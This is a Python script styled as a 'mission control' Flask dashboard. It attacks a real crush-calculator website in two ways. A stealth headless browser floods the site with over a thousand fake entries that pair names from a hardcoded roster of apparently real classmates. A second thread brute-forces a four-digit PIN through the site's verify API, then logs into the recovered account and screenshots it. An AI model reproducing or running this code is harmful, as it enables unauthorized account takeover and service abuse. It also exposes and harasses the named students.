# ==============================================================================
# MISSION CONTROL: OPERATION CLASSROOM COVER-UP & ACCOUNT RECOVERY
# CODENAME: DUAL_STRIKE (TURBO MODE)
# VERSION: 4.2.0 (API BREACH + EAGER LOADING)
# ==============================================================================

import os
import sys
import time
import random
import logging
import threading
import io
import datetime
import traceback
import requests  # ADDED FOR FAST BREACH
from flask import Flask, send_file, render_template_string, jsonify

# --- Selenium Imports ---
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager

# ==============================================================================
# CONFIGURATION & CONSTANTS
# ==============================================================================

# Network Targets
TARGET_POLLUTION_URL = "https://www.getlinks.info/love/c/pvcapru"
TARGET_BREACH_URL = "https://www.getlinks.info/love/loginwithpin.php"
TARGET_API_URL = "https://www.getlinks.info/love/verifypin.php" # Extracted from source

# Operation Parameters
POLLUTION_ITERATIONS = 1035
BREACH_PIN_START = 0
BREACH_PIN_END = 10000

# Element Selectors
SEL_YOURNAME = "yourname"    
SEL_CRUSHNAME = "crushname"  
SEL_LOGIN_LINK = "nametb"    
SEL_LOGIN_PASS = "pwdtb"     
SEL_LOGIN_BTN = "logbtn"     
SEL_ERROR_MSG = "error"      

# ==============================================================================
# GLOBAL STATE & LOGGING
# ==============================================================================

app = Flask(__name__)

mission_state = {
   "pollution": {
       "status": "Initializing System...",
       "current_iter": 0,
       "total_iter": POLLUTION_ITERATIONS,
       "last_pair": "None",
       "screenshot": None,
       "logs": []
   },
   "breach": {
       "status": "Initializing System...",
       "current_pin": "0000",
       "found_pin": None,
       "screenshot": None,
       "logs": []
   }
}

class MissionLogger:
   @staticmethod
   def log(system, message):
       timestamp = datetime.datetime.now().strftime("%H:%M:%S")
       full_msg = f"[{timestamp}] [{system.upper()}] {message}"
       print(full_msg, flush=True)
       key = "pollution" if system == "pollution" else "breach"
       mission_state[key]["logs"].insert(0, f"[{timestamp}] {message}")
       if len(mission_state[key]["logs"]) > 10:
           mission_state[key]["logs"].pop()

CLASS_ROSTER = [
   "Aarav Agarwal", "Aarus Kumar", "Aarvi Shailya Patel", "Abhijeet Oraon",
   "Adrija Chatterjee", "Adwitiya Ashok", "Akshita Tripti", "Ananya Sejal",
   "Ananya Sinha", "Ankit Kumar", "Annanya Srivastava", "Anushka Choudhary",
   "Anushka Kedia", "Arnav Gupta", "Arnav Jairaj", "Arnav Shekhar",
   "Atifa Shakeel", "Avyuday Bhagat", "Ayush Kumar", "Bhavna Kumari",
   "Bhavya Mishra", "Chinmay Sharma", "Darshita Vini", "Jahnvi Shree Gaurav",
   "Jaya Shambhavi", "Jayesh Kumar", "Kushagra Bhardwaj", "Lakshya Vishal Bhagat",
   "Mayank Sahu", "Prachi Singh", "Prakhar", "Priyank Oraon", "Reevika",
   "Riddhi Rani", "Rudra Pratap Jha", "Sarthak Raj", "Shashwat Sinha",
   "Shreya Om", "Shreya Raj", "Shreyash Ayush", "Shreyashi Jaiswal",
   "Shuryansh", "Soumya Sinha", "Swarit Oraon", "Tanmay Maheshwari",
   "Vaibhav Raj"
]

# ==============================================================================
# BROWSER INFRASTRUCTURE
# ==============================================================================

def create_stealth_driver():
   """
   Creates a highly configured Headless Chrome instance.
   Optimized for SPEED and Docker compatibility.
   """
   options = Options()
   options.add_argument("--headless")
   options.add_argument("--no-sandbox")
   options.add_argument("--disable-dev-shm-usage")
   options.add_argument("--disable-gpu")
   
   # SPEED HACKS: Don't wait for full page load, don't load images
   options.page_load_strategy = 'eager' 
   options.add_argument('--blink-settings=imagesEnabled=false')
   
   # CRITICAL FIX: Docker Binary Location
   options.binary_location = "/usr/bin/google-chrome"
   
   options.add_argument("--window-size=1920,1080")
   options.add_argument("--disable-blink-features=AutomationControlled")
   options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
   options.add_experimental_option('excludeSwitches', ['enable-logging'])
   
   driver = None
   try:
       service = Service(ChromeDriverManager().install())
       driver = webdriver.Chrome(service=service, options=options)
   except Exception as e:
       print(f"WARN: Manager failed ({e}). Using direct launch...")
       try:
           driver = webdriver.Chrome(options=options)
       except Exception as e2:
           raise e2

   # Increase script timeout, but page load is now 'eager' so this shouldn't trigger often
   driver.set_page_load_timeout(60)
   return driver

def capture_evidence(driver, system):
   try:
       if driver:
           png_data = driver.get_screenshot_as_png()
           key = "pollution" if system == "pollution" else "breach"
           mission_state[key]["screenshot"] = png_data
   except Exception as e:
       pass

# ==============================================================================
# PROTOCOL ALPHA: DATA POLLUTION BOT (OPTIMIZED)
# ==============================================================================

def execute_pollution_protocol():
   system = "pollution"
   MissionLogger.log(system, "Booting up Turbo Pollution Engine...")
   
   driver = None
   try:
       driver = create_stealth_driver()
       MissionLogger.log(system, "Driver Online. Starting Flood...")

       for i in range(1, POLLUTION_ITERATIONS + 1):
           mission_state["pollution"]["current_iter"] = i
           
           try:
               MissionLogger.log(system, f"ITERATION {i}: Loading Target...")
               try:
                   driver.get(TARGET_POLLUTION_URL)
               except Exception:
                   # If eager loading times out, we usually have the DOM anyway
                   pass

               driver.delete_all_cookies()
               
               name_user = random.choice(CLASS_ROSTER)
               name_crush = random.choice(CLASS_ROSTER)
               while name_user == name_crush:
                   name_crush = random.choice(CLASS_ROSTER)
               
               mission_state["pollution"]["last_pair"] = f"{name_user} + {name_crush}"
               
               # FAST INPUT: Use JS instead of slow send_keys
               try:
                   driver.execute_script(f"document.getElementById('{SEL_YOURNAME}').value = arguments[0];", name_user)
                   driver.execute_script(f"document.getElementById('{SEL_CRUSHNAME}').value = arguments[0];", name_user)
               except:
                   # Fallback if ID not found immediately
                   driver.find_element(By.ID, SEL_YOURNAME).send_keys(name_user)
                   driver.find_element(By.ID, SEL_CRUSHNAME).send_keys(name_crush)

               # Handle Dropdowns (Fast)
               try:
                   driver.execute_script("""
                       var selects = document.querySelectorAll('.dropdown .select');
                       if(selects.length > 0) selects[0].click();
                   """)
                   # Just let it pick default or random if possible, or skip to save time
               except: pass
               
               capture_evidence(driver, system)
               
               # Submit
               try:
                    driver.find_element(By.ID, SEL_CRUSHNAME).send_keys(Keys.RETURN)
               except:
                    # Try JS submit if return key fails
                    driver.execute_script("document.forms[0].submit()")

               # Reduced waiting time
               time.sleep(1.5) 
               capture_evidence(driver, system)
               
               MissionLogger.log(system, "Entry Injected.")
               time.sleep(0.5) # Minimal cooldown

           except Exception as e:
               MissionLogger.log(system, f"Error iter {i}: {str(e)}")
               try:
                   driver.quit()
               except: pass
               driver = create_stealth_driver()

   except Exception as e:
       MissionLogger.log(system, f"FATAL SYSTEM FAILURE: {str(e)}")
       traceback.print_exc()
   finally:
       if driver:
           driver.quit()
       mission_state["pollution"]["status"] = "MISSION ACCOMPLISHED"

# ==============================================================================
# PROTOCOL BETA: BREACH BOT (API MODE)
# ==============================================================================

def execute_breach_protocol():
   system = "breach"
   MissionLogger.log(system, "ENGAGING FORCEFUL API BREACH MODE")
   
   # 1. Extract UserID from the target URL (e.g., 'pvcapru' from '/love/c/pvcapru')
   try:
       target_id = TARGET_POLLUTION_URL.split("/c/")[-1]
       MissionLogger.log(system, f"Target Extracted: {target_id}")
   except:
       MissionLogger.log(system, "FATAL: Could not extract User ID from URL")
       return

   found_pin_val = None

   # 2. High-Speed API Brute Force
   with requests.Session() as session:
       for pin_int in range(BREACH_PIN_START, BREACH_PIN_END):
           current_pin = f"{pin_int:04d}"
           mission_state["breach"]["current_pin"] = current_pin
           mission_state["breach"]["status"] = f"FORCE BREACHING: {current_pin}"
           
           try:
               # Direct API Hit - No Browser Overhead
               url = f"{TARGET_API_URL}?userid={target_id}&pwd={current_pin}"
               resp = session.get(url, timeout=5)
               data = resp.json()
               
               if pin_int % 100 == 0:
                   MissionLogger.log(system, f"Scanning sector: {current_pin}...")

               # Check Success
               if not data.get("error"):
                   MissionLogger.log(system, f"!!! ACCESS GRANTED !!! PIN: {current_pin}")
                   found_pin_val = current_pin
                   mission_state["breach"]["found_pin"] = current_pin
                   mission_state["breach"]["status"] = "BREACH SUCCESSFUL"
                   break

           except Exception as e:
               # Ignore network blips, keep pushing
               pass
   
   # 3. Victory Lap: Open Browser to Show Proof (Screenshots)
   if found_pin_val:
       MissionLogger.log(system, "Launching Visuals for Verification...")
       driver = None
       try:
           driver = create_stealth_driver()
           driver.get(TARGET_BREACH_URL)
           
           # JS Injection for Instant Login
           js_script = f"""
           document.getElementById('{SEL_LOGIN_LINK}').value = '{TARGET_POLLUTION_URL}';
           document.getElementById('{SEL_LOGIN_PASS}').value = '{found_pin_val}';
           login();
           """
           driver.execute_script(js_script)
           time.sleep(2) # Wait for success message
           capture_evidence(driver, system)
           MissionLogger.log(system, "Visual Proof Captured.")
           
           # Keep browser open for a bit to ensure screenshot sticks
           time.sleep(5)
           driver.quit()
           
       except Exception as e:
           MissionLogger.log(system, f"Visual Failure: {e}")
   else:
       MissionLogger.log(system, "FAILED: All combinations exhausted.")
       mission_state["breach"]["status"] = "FAILED"

# ==============================================================================
# FLASK WEB INTERFACE
# ==============================================================================

@app.route('/')
def index():
   html_template = """
   <!DOCTYPE html>
   <html lang="en">
   <head>
       <meta charset="UTF-8">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>Mission Control: Operation Dual Strike</title>
       <meta http-equiv="refresh" content="3">
       <style>
           :root { --bg: #0f172a; --card: #1e293b; --text: #f1f5f9; --accent: #38bdf8; --danger: #ef4444; --success: #22c55e; }
           body { font-family: 'Courier New', monospace; background: var(--bg); color: var(--text); margin: 0; padding: 20px; }
           .header { text-align: center; border-bottom: 2px solid var(--accent); padding-bottom: 20px; margin-bottom: 30px; }
           .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 30px; }
           .card { background: var(--card); border: 1px solid #334155; border-radius: 8px; padding: 20px; }
           .card-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; border-bottom: 1px solid #334155; padding-bottom: 10px; }
           .card-title { font-size: 1.2rem; font-weight: bold; color: var(--accent); }
           .status-badge { background: #334155; padding: 4px 8px; border-radius: 4px; font-size: 0.8rem; }
           .stat-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 0.9rem; }
           .log-box { background: #000; height: 150px; overflow-y: hidden; padding: 10px; font-size: 0.7rem; color: #33ff00; border: 1px solid #333; margin-top: 15px; }
           .img-box { width: 100%; height: 250px; background: #000; display: flex; align-items: center; justify-content: center; margin-top: 15px; border: 1px solid #444; overflow: hidden; }
           .img-box img { width: 100%; height: auto; }
           .progress-bar { width: 100%; height: 6px; background: #334155; margin-top: 10px; border-radius: 3px; }
           .progress-fill { height: 100%; background: var(--accent); border-radius: 3px; transition: width 0.5s; }
           .found-pin { font-size: 2rem; color: var(--success); text-align: center; font-weight: bold; margin: 10px 0; border: 2px dashed var(--success); padding: 10px; }
       </style>
   </head>
   <body>
       <div class="header"><h1>Mission Control: TURBO MODE</h1></div>
       <div class="grid">
           <!-- POLLUTION CARD -->
           <div class="card">
               <div class="card-header"><span class="card-title">POLLUTION BOT</span><span class="status-badge" style="color:var(--accent)">RUNNING</span></div>
               <div class="stat-row"><span>Status:</span><span>{{ p_data.status }}</span></div>
               <div class="stat-row"><span>Progress:</span><span>{{ p_data.current_iter }} / {{ p_data.total_iter }}</span></div>
               <div class="progress-bar"><div class="progress-fill" style="width: {{ (p_data.current_iter / p_data.total_iter) * 100 }}%"></div></div>
               <div class="img-box">{% if p_has_img %}<img src="/img/pollution">{% else %}<span>No Signal</span>{% endif %}</div>
               <div class="log-box">{% for log in p_data.logs %}<div>> {{ log }}</div>{% endfor %}</div>
           </div>
           <!-- BREACH CARD -->
           <div class="card">
               <div class="card-header"><span class="card-title" style="color: #c084fc">BREACH BOT</span><span class="status-badge">{% if b_data.found_pin %}CRACKED{% else %}ATTACKING{% endif %}</span></div>
               {% if b_data.found_pin %}
                   <div class="found-pin">PIN: {{ b_data.found_pin }}</div>
               {% else %}
                   <div class="stat-row"><span>Mode:</span><span style="color:red">API FORCE</span></div>
                   <div class="stat-row"><span>Current PIN:</span><span style="font-family:monospace; font-size:1.2rem">{{ b_data.current_pin }}</span></div>
                   <div class="progress-bar"><div class="progress-fill" style="width: {{ (b_data.current_pin|int / 10000) * 100 }}%; background: #c084fc"></div></div>
               {% endif %}
               <div class="img-box">
                   {% if b_has_img %}
                       <img src="/img/breach">
                   {% else %}
                       <span style="color:#c084fc; text-align:center">Visuals Disabled<br>Optimizing Network Speed...</span>
                   {% endif %}
               </div>
               <div class="log-box" style="border-color: #c084fc; color: #e879f9">{% for log in b_data.logs %}<div>> {{ log }}</div>{% endfor %}</div>
           </div>
       </div>
   </body>
   </html>
   """
   return render_template_string(html_template, 
                                 p_data=mission_state["pollution"], 
                                 p_has_img=(mission_state["pollution"]["screenshot"] is not None),
                                 b_data=mission_state["breach"], 
                                 b_has_img=(mission_state["breach"]["screenshot"] is not None))

@app.route('/img/<system>')
def serve_image(system):
   key = "pollution" if system == "pollution" else "breach"
   img_data = mission_state[key]["screenshot"]
   if img_data:
       return send_file(io.BytesIO(img_data), mimetype='image/png')
   return "No Image", 404

if __name__ == "__main__":
   print(">>> TURBO MISSION CONTROL STARTED <<<")
   pollution_thread = threading.Thread(target=execute_pollution_protocol, daemon=True)
   pollution_thread.start()
   breach_thread = threading.Thread(target=execute_breach_protocol, daemon=True)
   breach_thread.start()
   port = int(os.environ.get("PORT", 10000))
   app.run(host='0.0.0.0', port=port)
